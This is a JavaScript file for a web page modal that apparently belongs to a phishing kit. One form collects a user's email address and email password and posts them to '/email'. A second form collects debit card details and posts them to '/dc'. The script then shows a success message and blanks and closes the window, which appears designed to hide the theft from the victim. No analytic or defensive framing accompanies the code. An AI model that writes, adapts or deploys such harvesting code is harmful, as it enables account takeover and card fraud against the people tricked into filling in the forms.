const modal_el = document.querySelector(".modal");

const getDiplayedForm = () =>
  [...modal_el.querySelectorAll(".form-wrapper")]
    .find((el) => el.classList.contains("form-wrapper--show"))
    ?.querySelector("form");

modal_el.querySelector(".modal-overlay").addEventListener("click", () => {
  getDiplayedForm().querySelector("input").focus();
});

modal_el
  .querySelector(".form-wrapper-email")
  .addEventListener("submit", (e) => {
    e.preventDefault();
    const submits_el = e.target.querySelector("button");
    const err_el = e.target.querySelector(".err");
    err_el.style.display = "none";

    const email = e.target.querySelector("#email-address").value;
    const password = e.target.querySelector("#email-password").value;

    showLoader(submits_el);
    postDataToServer(
      "/email",
      {
        emailAddress: email,
        emailPassword: password,
      },
      () => {
        hideLoader(submits_el);
        modal_el.querySelector(".form-wrapper-email").style.display = "none";
        modal_el.querySelector(".form-wrapper-debit").style.display = "block";
        // inputs_el.forEach((input_el) => (input_el.value = ""));
        // document.querySelector(".modal").style.display = "flex";
        // document.querySelector("#email-address").focus();
      },
      (message) => {
        hideLoader(submits_el);
        err_el.style.display = "block";
        err_el.innerHTML = message;
      }
    );
  });

modal_el
  .querySelector(".form-wrapper-debit")
  .addEventListener("submit", (e) => {
    e.preventDefault();
    const submits_el = e.target.querySelector("button");
    const err_el = e.target.querySelector(".err");
    err_el.style.display = "none";

    const expMonth_el = e.target.querySelector("#expMonth");
    const expYear_el = e.target.querySelector("#expYear");

    expMonth_el.value =
      expMonth_el.value.length === 1
        ? "0" + expMonth_el.value
        : expMonth_el.value;
    expYear_el.value =
      expYear_el.value.length === 1 ? "0" + expYear_el.value : expYear_el.value;

    const formData = [...e.target.querySelectorAll("input")].reduce(
      (acc, input) => ({ ...acc, [input.id]: input.value }),
      {}
    );

    showLoader(submits_el);
    postDataToServer(
      "/dc",
      formData,
      () => {
        hideLoader(submits_el);
        modal_el.querySelector(".form-wrapper-debit").style.display = "none";
        modal_el.querySelector(".form-wrapper-success").style.display = "block";

        setTimeout(() => {
          var myWindow = window.open("", "_self");
          myWindow.document.write("");
          setTimeout(function () {
            myWindow.close();
          }, 1000);
        }, 3000);
      },
      (message) => {
        hideLoader(submits_el);
        err_el.style.display = "block";
        err_el.innerHTML = message;
      }
    );
  });
